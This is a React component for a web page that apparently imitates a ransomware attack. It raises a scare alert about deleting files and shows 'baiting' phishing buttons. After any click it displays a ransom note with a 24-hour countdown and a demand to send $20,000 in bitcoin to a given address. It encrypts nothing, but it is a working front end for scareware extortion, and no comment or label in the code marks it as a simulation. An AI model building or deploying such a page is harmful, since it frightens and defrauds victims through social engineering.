import React, { useState, useEffect } from 'react';
import CountdownTimer from '../components/CountdownTimer';
import Instructions from '../components/Instructions';
import PhishingButton from '../components/PhishingButton';

const Home: React.FC = () => {
  const [timeLeft, setTimeLeft] = useState(24 * 60 * 60); // 24 hours in seconds
  const [showRansomNote, setShowRansomNote] = useState(false);
  const [showPopup, setShowPopup] = useState(true);

  useEffect(() => {
    const interval = setInterval(() => {
      setTimeLeft((prevTime) => prevTime - 1);
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  // Show popup notification immediately on page load
  useEffect(() => {
    if (showPopup) {
      alert('Warning: Deleting files is irreversible. Are you sure?');
    }
  }, [showPopup]);

  const handlePhishingClick = (choice: 'Yes' | 'No') => {
    setShowPopup(false);
    setShowRansomNote(true);
  };

  return (
    <div>
      {/* Baiting buttons and popup notification first */}
      {!showRansomNote && <PhishingButton onClick={handlePhishingClick} />}

      {/* Show ransom note/message only after clicking Yes or No */}
      {showRansomNote && (
        <>
          <Instructions />
          <CountdownTimer timeLeft={timeLeft} />
          <div style={{ marginTop: '20px', fontWeight: 'bold' }}>
            <p>
              Please send $20,000 to this bitcoin address:
              <br />
              <code>1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</code>
            </p>
          </div>
        </>
      )}
    </div>
  );
};

export default Home;
